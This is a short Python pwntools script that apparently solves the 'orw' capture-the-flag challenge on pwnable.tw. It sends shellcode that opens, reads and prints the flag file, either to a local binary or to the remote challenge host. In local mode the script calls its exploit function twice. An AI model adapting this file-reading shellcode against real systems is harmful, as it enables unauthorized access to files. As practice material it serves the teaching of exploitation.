from pwn import *
import sys

HOST = 'chall.pwnable.tw'
PORT = 10001

def exploit(p):
    # learn from other write-ups
    shellcode = ''
    shellcode += shellcraft.pushstr('/home/orw/flag')
    shellcode += shellcraft.open('esp', 0, 0)
    shellcode += shellcraft.read('eax', 'esp', 0x80)
    shellcode += shellcraft.write(1, 'esp', 0x80)
    p.sendline(asm(shellcode))
    p.interactive()

if __name__=='__main__':
    if len(sys.argv)==1:        # default local
        p = process(['./orw'])
        exploit(p)
    elif sys.argv[1]=='remote':       # remote
        p = remote(HOST, PORT)
    pause()
    exploit(p)
